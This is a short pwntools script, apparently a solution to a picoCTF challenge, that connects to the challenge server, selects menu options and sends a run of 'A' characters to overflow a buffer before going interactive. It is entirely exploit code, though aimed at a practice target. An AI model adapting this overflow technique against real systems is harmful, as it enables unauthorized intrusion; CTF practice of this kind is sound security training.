from pwn import *

elf = context.binary = ELF('./chall')
#p = process()
p = remote('tethys.picoctf.net', 58407)

p.sendlineafter('Enter your choice: ', '2')
payload = 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
p.sendlineafter('Data for buffer: ', payload)

p.sendlineafter('Enter your choice: ', '4')

p.interactive()